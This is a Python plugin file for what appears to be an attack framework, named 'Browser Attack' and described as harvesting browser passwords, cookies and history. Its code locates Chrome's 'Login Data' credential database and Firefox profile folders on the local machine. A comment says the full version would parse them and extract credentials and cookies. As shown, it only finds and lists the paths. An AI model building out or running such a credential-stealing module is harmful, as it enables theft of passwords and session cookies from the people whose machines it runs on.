from core.plugin_base import PluginBase
import os
import shutil

class BrowserAttackPlugin(PluginBase):
    @property
    def name(self): return "Browser Attack"
    @property
    def description(self): return "Harvests browser passwords, cookies, and history from local machine (Chrome, Edge, Firefox)."

    def run(self, target="local", **kwargs):
        try:
            # Windows: Local browser data directories (user must have access rights)
            user_profile = os.environ.get("USERPROFILE") or os.environ.get("HOME")
            paths = [
                os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
                os.path.join(user_profile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
            ]
            found = []
            for path in paths:
                if os.path.exists(path):
                    found.append(path)
            if not found:
                return "No browser databases found (run as user with a browser profile)."
            # Real logic would parse LevelDB or sqlite DB, extract credentials/cookies
            return f"Found browser data:\n" + "\n".join(found)
        except Exception as e:
            return f"Browser attack failed: {e}"

def get_plugin():
    return BrowserAttackPlugin()
